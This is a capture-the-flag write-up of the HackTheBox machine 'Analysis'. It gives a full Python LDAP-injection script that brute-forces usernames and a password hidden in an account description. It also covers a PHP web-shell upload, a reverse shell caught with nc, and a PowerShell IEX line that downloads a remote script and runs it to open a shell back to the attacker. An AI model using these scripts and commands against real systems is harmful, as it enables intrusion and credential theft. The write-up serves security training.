---
layout: writeup
category: HTB
description: Analysis is a hard machine of HackTheBox in which we have to do the following things. First, we have to enumerate files and directories recursively with a tool like feroxbuster. Then, I will abuse LDAP injection to see the password of a user in the description with a python script. Also, we can abuse a php upload vulnerability to gain access to the system as svc_web. Later, we can see saved credentials in AutoLogon to have access as jdoe. Finally, we can abuse a DLL injection in Snort dynamic preprocessor that Administrator will execute and we gain access as him.
points: 40
solves: 1941
tags: fuzzing ldap-injection php-shell upload-vulnerabilities autologon dll-injection
date: 2024-06-05
title: HTB Analysis Writeup
comments: true
---

Analysis is a hard machine of HackTheBox in which we have to do the following things. First, we have to enumerate files and directories recursively with a tool like feroxbuster. Then, I will abuse LDAP injection to see the password of a user in the description with a python script. Also, we can abuse a php upload vulnerability to gain access to the system as svc_web. Later, we can see saved credentials in AutoLogon to have access as jdoe. Finally, we can abuse a DLL injection in Snort dynamic preprocessor that Administrator will execute and we gain access as him.

# Enumeration

## Port scanning

We start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.250
# Nmap 7.94SVN scan initiated Wed Jun  5 22:04:01 2024 as: nmap -p- --open -sSVC --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.250
Nmap scan report for 10.10.11.250
Host is up (0.047s latency).
Not shown: 65445 closed tcp ports (reset), 61 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-05 20:04:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49950/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=6/5%Time=6660C4CC%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\
SF:0\0\x0b\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(RTSPRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05
SF:\x1a\0")%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0
SF:\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Help,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(TerminalServerCookie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TL
SF:SSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\
SF:x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Four
SF:OhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0
SF:\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%
SF:r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20message\"\x05
SF:HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\
SF:0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x
SF:20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WM
SF:SRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid\x20message
SF:-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(af
SF:p,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\
SF:0");
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-05T20:05:20
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun  5 22:05:29 2024 -- 1 IP address (1 host up) scanned in 87.48 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

RPC, Kerberos, DNS and MySQL enumeration doesn't return nothing interesting.
LDAP gives us the domain `analysis.htb` in nmap scripts so we can add this line to the `/etc/hosts` file to correctly resolve this domain to the target ip:

```bash
10.10.11.250 analysis.htb
```

Now let's jump to web enumeration.

## Web enumeration
            
First let's see the technologies used with whatweb:


```bash
❯ whatweb http://10.10.11.250
http://10.10.11.250 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-HTTPAPI/2.0], IP[10.10.11.250], Microsoft-HTTPAPI[2.0], Title[Not Found]
```

We see a `404 Not Found` status code with the IP, let's try the domain:

```bash
❯ whatweb http://analysis.htb
http://analysis.htb [200 OK] Country[RESERVED][ZZ], Email[mail@demolink.org,privacy@demolink.org], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.250], JQuery, Microsoft-IIS[10.0], Script[text/javascript]
```

Nothing interesting, now searching for subdomains we can see internal.analysis.htb with `403 Forbidden` access:

```bash
❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.analysis.htb" -u http://analysis.htb --hh=315
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://analysis.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000387:   403        29 L     95 W       1268 Ch     "internal"                                                                                                             

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Add internal.analysis.htb to the `/etc/hosts`.

# Access as svc_web

Although the / returns 403, we can try to fuzz to see available files/directories, I will use feroxbuster as it searches recursively and we save a lot of time with a lowercase dictionary (as it's windows) and extension php (as when we start to fuzz we can see that it uses PHP):

```bash
❯ feroxbuster --url http://internal.analysis.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -x php -C 404 -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://internal.analysis.htb
 🚀  Threads               │ 100
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       29l       93w     1284c http://internal.analysis.htb/                                                                                                 
301      GET        2l       10w      170c http://internal.analysis.htb/users => http://internal.analysis.htb/users/                                                            
200      GET        1l        2w       17c http://internal.analysis.htb/users/list.php                                                                                          
301      GET        2l       10w      174c http://internal.analysis.htb/dashboard => http://internal.analysis.htb/dashboard/                                                    
302      GET        0l        0w        3c http://internal.analysis.htb/dashboard/logout.php => ../employees/login.php                                                          
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/css => http://internal.analysis.htb/dashboard/css/                                              
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/img => http://internal.analysis.htb/dashboard/img/                                            
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/lib => http://internal.analysis.htb/dashboard/lib/                                              
200      GET        0l        0w        0c http://internal.analysis.htb/dashboard/upload.php                                                                                   
301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/uploads => http://internal.analysis.htb/dashboard/uploads/                               
301      GET        2l       10w      177c http://internal.analysis.htb/dashboard/js => http://internal.analysis.htb/dashboard/js/                                           
200      GET        4l        4w       38c http://internal.analysis.htb/dashboard/index.php                                                                                 
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/                                                                                          
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/form.php                                                                                  
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/css/                                                                                       
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/lib/                                                                                           
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/img/                                                                                            
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/details.php                                                                                    
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/uploads/                                                                                      
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/js/                                                                                           
301      GET        2l       10w      174c http://internal.analysis.htb/employees => http://internal.analysis.htb/employees/                                                    
200      GET       30l       60w     1085c http://internal.analysis.htb/employees/login.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/tickets.php                                                                                   
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/emergency.php
[####################] - 7m    244415/244415  0s      found:25      errors:837    
[####################] - 7m     56294/56294   130/s   http://internal.analysis.htb/ 
[####################] - 7m     56294/56294   128/s   http://internal.analysis.htb/users/ 
[####################] - 7m     56294/56294   128/s   http://internal.analysis.htb/dashboard/ 
[####################] - 7m     56294/56294   139/s   http://internal.analysis.htb/employees/ 
```

I will focus on those with 200 status code:

In the list.php, we get a `missing parameter` message:


```bash
❯ curl -s -X GET http://internal.analysis.htb/users/list.php
missing parameter        
```

Let's try fuzzing for this parameter with a specific wordlist of parameters (/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt) hidding with `--hs` the string `missing parameter`:

```bash
❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://internal.analysis.htb/users/list.php?FUZZ=test' --hs="missing parameter"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://internal.analysis.htb/users/list.php?FUZZ=test
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000003598:   200        0 L      11 W       406 Ch      "name"                                                                                                                 

Total time: 0
Processed Requests: 6453
Filtered Requests: 6452
Requests/sec.: 0
```

We see the parameter `name`. In the browser, it seems to be a search for users as that fields says 'Username', 'Last Name', '...':

![Search users functionality](/assets/images/Analysis/search_users_functionality.png)

Trying SQL injections doesn't work:

![SQL injection 1 doesn't work](/assets/images/Analysis/sql_injection1_doesn't_work.png)

![SQL injection 2 doesn't work](/assets/images/Analysis/sql_injection2_doesn't_work.png)

Let's fuzz special characters for different responses with wfuzz and hidding the string "CONTACT_" as it's what we receive in a invalid response and urlencoding it as some characters may conflict with url special characters:

```bash
❯ wfuzz -c -z file,/opt/SecLists/Fuzzing/special-chars.txt,urlencode -u 'http://internal.analysis.htb/users/list.php?name=FUZZ' --hs="CONTACT_"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://internal.analysis.htb/users/list.php?name=FUZZ
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000010:   200        0 L      1 W        8 Ch        "%28"                                                                                                                  
000000009:   200        0 L      11 W       418 Ch      "%2A"                                                                                                                  
000000011:   200        0 L      1 W        8 Ch        "%29"                                                                                                                  
000000021:   200        0 L      1 W        8 Ch        "%5C"                                                                                                                  

Total time: 0.345897
Processed Requests: 32
Filtered Requests: 28
Requests/sec.: 92.51290

❯ php -r 'echo urldecode("%29\n"); echo urldecode("%28\n"); echo urldecode("%2A\n"); echo urldecode("%5C\n");';echo
)
(
*
\
```

We see that those characters return different responses and trying the wildcard returns the user `technician`:

![Wildcard valid response](/assets/images/Analysis/wildcard_valid_response.png)

A common service that uses this characters is [LDAP](https://www.okta.com/identity-101/what-is-ldap/), which makes sense as it's a windows machine and we saw the port 389, 3268 (LDAP) opened in nmap. Also, this could have a vulnerability called [LDAP injection](https://book.hacktricks.xyz/pentesting-web/ldap-injection), and trying it here with burpsuite (to urlencode characters) we can see that it works:

![LDAP injection valid](/assets/images/Analysis/ldap_injection_valid.png)

As this query searches for username, we can try to bruteforce them with the wildcard to see which users are available, for example t with * (as we known that a valid user is technician) returns a valid response:

![LDAP valid response with t and wildcard](/assets/images/Analysis/ldap_valid_response_with_t_and_wildcard.png)

But a invalid, returns a response with the `CONTACT_` string:

![LDAP invalid response with f and wildcard](/assets/images/Analysis/ldap_invalid_response_with_f_and_wildcard.png)

Using this criteria, I can create a python script that loops into all the characters and makes the http request, in case that `CONTACT_` string is found in response, it will continue until it found that `CONTACT_` string is not found in the response. In the case that it's not found, it will add the character to a variable and continue with the requests with this variable and the character. Also, instead of using requests library, I will use aiohttp and asyncio to have very fast speed:

```python
#!/usr/bin/python3
import string, requests
import pdb, sys
import signal
import aiohttp
import asyncio
from pwn import *

# Ctrl+c
def def_handler(sig,frame):
    print("\n\n[-] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Fetch a url and return the response
async def fetch(session, url, retries=3):
    for attempt in range(retries):
        try:
            async with session.get(url) as response:
                return await response.text()
        except (aiohttp.ClientOSError, aiohttp.ClientConnectionError, asyncio.TimeoutError) as e:
                if attempt < retries - 1:
                    await asyncio.sleep(2 ** attempt)  # Exponential backoff
                else:
                    print(f"Failed to fetch {url}: {e}")
                    return None

async def makeRequests():
    chars = string.ascii_lowercase + string.digits
    results = []
    p1 = log.progress("Brute status")
    p2 = log.progress("Currently finding username")
    p3 = log.progress("Finded usernames")
    async with aiohttp.ClientSession() as session:
        for char in chars:
            
            first_url = f"http://internal.analysis.htb/users/list.php?name={char}*"
            r = await fetch(session, first_url)
            end_loop = False
            if "CONTACT_" not in r:
                result = char 
                while True:
                    for char in chars:
                        
                        url = f"http://internal.analysis.htb/users/list.php?name={result}{char}*"
                        r = await fetch(session,url)
                        if "CONTACT_" not in r:
                            result += char
                            break
                        else:
                            if char == chars[-1]:
                                end_loop = True
                                results.append(result)
                                p3.status(results)
                                break
                        p1.status(f"{[*chars].index(char) + 1}/{len(chars)}")
                        p2.status(result)
                    if end_loop:
                        break            
if __name__ == '__main__':
    
    asyncio.run(makeRequests())
```

Now run the script and we are gived valid users:

```bash
❯ python3 ldap_injection.py
[◒] Brute status: 36/36
[d] Currently finding username: technician
[0] Finded usernames: ['amanson', 'badam', 'jangel', 'lzen', 'technician']
```

Now let's brute all the valid fields in LDAP to see the interesting ones and then see the value for each user.

For that, 

I will modify the script for that we can pass the thing that we wanna brute in the script. Also I will do some handling when the characters `*`, `(`, `)`, `&` and `#` because if there is that character in the request, it will behave bad:

![Double wildcard fails](/assets/images/Analysis/double_wildcard_fails.png)

But if I put a wildcard before some letters and after the letters there is a wildcard, the first wildcard will be treated as a string and not as a wildcard. So I will modify the script to include the function above and the one to bruteforce fields and to select from the terminal which to use with sys.argv. Also, I will replace in the chars '(', ')', '&' and '#' with nothing assuming there aren't those characters in the field names:

```python
#!/usr/bin/python3
import string, requests
import pdb, sys
import signal
import aiohttp
import asyncio
from pwn import *

# Handle ctrl+c
def def_handler(sig,frame):
    print("\n\n[-] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables
chars = string.ascii_letters + string.digits + string.punctuation
chars = chars.replace(')', '').replace('(', '').replace('&', '').replace('#', '')

# Function to fetch a url and return a response

async def fetch(session, url, retries=3):
    for attempt in range(retries):
        try:
            async with session.get(url) as response:
                return await response.text()
        except (aiohttp.ClientOSError, aiohttp.ClientConnectionError, asyncio.TimeoutError) as e:
                if attempt < retries - 1:
                    await asyncio.sleep(2 ** attempt)  # Exponential backoff
                else:
                    print(f"Failed to fetch {url}: {e}")
                    return None

# Function to brute valid usernames
async def bruteUsernames():
    chars = string.ascii_lowercase + string.digits
    results = []
    p1 = log.progress("Brute status")
    p2 = log.progress("Currently finding username")
    p3 = log.progress("Finded usernames")
    async with aiohttp.ClientSession() as session:
        for char in chars:
            
            first_url = f"http://internal.analysis.htb/users/list.php?name={char}*"
            r = await fetch(session, first_url)
            end_loop = False
            if "CONTACT_" not in r:
                result = char 
                while True:
                    for char in chars:
                        
                        url = f"http://internal.analysis.htb/users/list.php?name={result}{char}*"
                        r = await fetch(session,url)
                        if "CONTACT_" not in r:
                            result += char
                            break
                        else:
                            if char == chars[-1]:
                                end_loop = True
                                results.append(result)
                                p3.status(results)
                                break
                        p1.status(f"{[*chars].index(char) + 1}/{len(chars)}")
                        p2.status(result)
                    if end_loop:
                        break
# Function to enumerate valid fields
async def bruteFields():
    p1 = log.progress("All fields")
    p2 = log.progress("Currently finding attribute")
    results = []
    result = ''
    async with aiohttp.ClientSession() as session:
        with open("/opt/SecLists/Fuzzing/LDAP-active-directory-attributes.txt", "r") as f:
            for attribute in f.readlines():
                p2.status(attribute)
                attribute = attribute.strip("\n")
                url = f"http://internal.analysis.htb/users/list.php?name=*)({attribute}%3d*"
                r = await fetch(session, url)
                
                if "CONTACT_" not in r and "<strong>" in r:
                    results.append(attribute)
                p1.status(results)
if __name__ == '__main__':
    
    if len(sys.argv) < 2:
        print(f"""[i] Usage: python3 {sys.argv[0]} [usernameEnum/bruteFieldContent/bruteFields]
                - usernameEnum: enumerates usernames of the machine
                - bruteFields: brute all valid fields.
              """)
        sys.exit(1)
    else:
        if sys.argv[1] == "usernameEnum":
            asyncio.run(bruteUsernames())
        elif sys.argv[1] == "bruteFields":
            asyncio.run(bruteFields())
        else:
            print("Invalid value of arguments")

```

Now execute it:


```bash
❯ python3 ldap_injection.py bruteFields
[p] All fields: ['accountExpires', 'badPasswordTime', 'badPwdCount', 'cn', 'codePage', 'countryCode', 'createTimeStamp', 'description', 'distinguishedName', 'givenName', 'instanceType', 'lastLogoff', 'lastLogon', 'logonCount', 'modifyTimeStamp', 'name', 'nTSecurityDescriptor', 'objectCategory', 'objectClass', 'objectGUID', 'objectSid', 'pwdLastSet', 'replPropertyMetaData', 'sAMAccountName', 'sAMAccountType', 'sn', 'userAccountControl', 'userPrincipalName']
[◓] Currently finding attribute: userSharedFolder
```

The only interesting field is the description.
Now that we have valid users and all valid fields, we can loop through them to brute their description to see if there is some privileged info. For that, I will create the function bruteFieldContent that also do some handling for the `*` character for the case it's in the description. This is the final complete script:

```python
#!/usr/bin/python3
import string, requests
import pdb, sys
import signal
import aiohttp
import asyncio
from pwn import *

# Handle ctrl+c
def def_handler(sig,frame):
    print("\n\n[-] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables
chars = string.ascii_letters + string.digits + string.punctuation
chars = chars.replace(')', '').replace('(', '').replace('&', '').replace('#', '')

# Function to fetch a url and return a response

async def fetch(session, url, retries=3):
    for attempt in range(retries):
        try:
            async with session.get(url) as response:
                return await response.text()
        except (aiohttp.ClientOSError, aiohttp.ClientConnectionError, asyncio.TimeoutError) as e:
                if attempt < retries - 1:
                    await asyncio.sleep(2 ** attempt)  # Exponential backoff
                else:
                    print(f"Failed to fetch {url}: {e}")
                    return None

# Function to brute valid usernames
async def bruteUsernames():
    chars = string.ascii_lowercase + string.digits
    results = []
    p1 = log.progress("Brute status")
    p2 = log.progress("Currently finding username")
    p3 = log.progress("Finded usernames")
    async with aiohttp.ClientSession() as session:
        for char in chars:
            
            first_url = f"http://internal.analysis.htb/users/list.php?name={char}*"
            r = await fetch(session, first_url)
            end_loop = False
            if "CONTACT_" not in r:
                result = char 
                while True:
                    for char in chars:
                        
                        url = f"http://internal.analysis.htb/users/list.php?name={result}{char}*"
                        r = await fetch(session,url)
                        if "CONTACT_" not in r:
                            result += char
                            break
                        else:
                            if char == chars[-1]:
                                end_loop = True
                                results.append(result)
                                p3.status(results)
                                break
                        p1.status(f"{[*chars].index(char) + 1}/{len(chars)}")
                        p2.status(result)
                    if end_loop:
                        break
# Function to enumerate valid fields
async def bruteFields():
    p1 = log.progress("All fields")
    p2 = log.progress("Currently finding attribute")
    results = []
    result = ''
    async with aiohttp.ClientSession() as session:
        with open("/opt/SecLists/Fuzzing/LDAP-active-directory-attributes.txt", "r") as f:
            for attribute in f.readlines():
                p2.status(attribute)
                attribute = attribute.strip("\n")
                url = f"http://internal.analysis.htb/users/list.php?name=*)({attribute}%3d*"
                r = await fetch(session, url)
                
                if "CONTACT_" not in r and "<strong>" in r:
                    results.append(attribute)
                p1.status(results)
# Function to brute content of a specific field
async def bruteFieldContent(field,username):
    p1 = log.progress(f"Brute forcing field '{field}' of username '{username}'")
    p2 = log.progress(f"Content of {field} of {username}")

    result = ''
    end_while_loop = False
    async with aiohttp.ClientSession() as session:
        while True:
            for char in chars:
                p1.status(f"{[*chars].index(char) + 1}/{len(chars)}")
                url = f"http://internal.analysis.htb/users/list.php?name={username})({field}%3d{result}{char}*"
                r = await fetch(session, url)
                end_for_loop = False
                if "CONTACT_" not in r and "<strong>" in r:
                    result += char
                    p2.status(result)
                    break
                elif char == chars[-1]:
                    end_while_loop = True
                    break
                elif char == '*':
                    for char in chars:
                        char = '*' + char
                        url = f"http://internal.analysis.htb/users/list.php?name={username})({field}%3d{result}{char}*"
                        r = await fetch(session, url)
                        if "CONTACT_" not in r and "<strong>" in r:
                            result += char
                            end_for_loop = True
                            break
                if end_for_loop:
                    break
                    
            if end_while_loop:
                break
if __name__ == '__main__':
    
    if len(sys.argv) < 2:
        print(f"""[i] Usage: python3 {sys.argv[0]} [usernameEnum/bruteFieldContent/bruteFields]
                - usernameEnum: enumerates usernames of the machine
                - bruteFieldContent [field] [username]: specify the field to brute for a specific field and username
                - bruteFields: brute all valid fields.
              """)
        sys.exit(1)
    else:
        if sys.argv[1] == "usernameEnum":
            asyncio.run(bruteUsernames())
        elif sys.argv[1] == "bruteFieldContent":
            if not sys.argv[2] or not sys.argv[3]:
                print("Please specify field and username")
            field = sys.argv[2]
            username = sys.argv[3]
            asyncio.run(bruteFieldContent(field,username))
        elif sys.argv[1] == "bruteFields":
            asyncio.run(bruteFields())
        else:
            print("Invalid value for arguments")
```

Now execute this to loop through all usernames and see their description:

```bash
❯ usernames=(amanson badam jangel lzen technician);for username in ${usernames[@]};do python3 ldap_injection.py bruteFieldContent description $username; done
[O] Brute forcing field 'description' of username 'amanson': 90/90
[-] Content of description of amanson
[v] Brute forcing field 'description' of username 'badam': 90/90
[d] Content of description of badam
[-] Brute forcing field 'description' of username 'jangel': 90/90
[b] Content of description of jangel
[↙] Brute forcing field 'description' of username 'lzen': 90/90
[ ] Content of description of lzen
[/.......] Brute forcing field 'description' of username 'technician': 90/90
[.] Content of description of technician: 97NTtl*4QP96Bv
```

We can see that the only interesting one is the description of user 'technician' which looks like a password. Let's try this for smb:

```bash
❯ netexec smb 10.10.11.250 -u technician -p '97NTtl*4QP96Bv'
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [+] analysis.htb\technician:97NTtl*4QP96Bv
```

It works but we can't access the machine with winrm:

```bash
❯ netexec winrm 10.10.11.250 -u technician -p '97NTtl*4QP96Bv'
SMB         10.10.11.250    5985   DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb)
HTTP        10.10.11.250    5985   DC-ANALYSIS      [*] http://10.10.11.250:5985/wsman
WINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\technician:97NTtl*4QP96Bv
```

Also, enumerating Active Directory with this credentials doesn't led to nothing useful. But we can use it in the login form of the web that we found before(/employees/login.php) and it works:

![Dashboard technician](/assets/images/Analysis/dashboard_technician.png)

Among all the functionalities, we can see a interesting one that led us upload files:

![Upload files functionality](/assets/images/Analysis/upload_files_func.png)

When we upload a file, it give us the path for the uploaded file:

![File path in upload](/assets/images/Analysis/file_path_in_upload.png)

As the web works with PHP, let's try to upload a php shell:

![PHP shell uploaded](/assets/images/Analysis/php_shell_uploaded.png)

![Using PHP shell](/assets/images/Analysis/using_php_shell.png)

Now we can use a powershell shell from [revshells.com](https://www.revshells.com/). I will use "Poweshell #3 (Base64)", urlencode it and pass it to the cmd parameter:

![Revshell powershell payload](/assets/images/Analysis/rev_shell_powershell_payload.png)

And we receive the shell:

```bash
❯ rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.225] from (UNKNOWN) [10.10.11.250] 57936

PS C:\inetpub\internal\dashboard\uploads>
```

Now I will use ConPtyShell to stabilize the shell and for showing errors, doing ctrl+c, etc:

### Spawn http server to share Invoke-ConPtyShell.ps1
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

### Spawn nc to receive the shell
```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

### Execute the script from http server and execute ConPtyShell
```powershell
PS C:\inetpub\internal\dashboard\uploads> IEX(New-Object Net.WebClient).downloadString("http://10.10.14.225/Invoke-ConPtyShell.ps1")
PS C:\inetpub\internal\dashboard\uploads> Invoke-ConPtyShell -RemoteIp 10.10.14.225 -RemotePort 443 -Rows 50 -Cols 184
```

Now in the nc listener, do ctrl+z, `stty raw -echo;fg` and clean with ctrl+l. At the first time when you change directory, it might give an error, but it's not important and it then will work ok. Now you are in a fully interactive shell and you can do ctrl+c, you have autocomplete and you can view errors that you can have in powershell.

# Access as jdoe

Running WinPEAS, we can see AutoLogon Credentials:

```powershell
PS C:\Windows\Temp\privesc> .\winPEASx64.exe | tee output.txt 
[...SNIP...]
```

Transfer the output.txt to your machine using [smb](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration#smb) with credentials (or it will fail). And here we can see the autologon credentials:

```bash
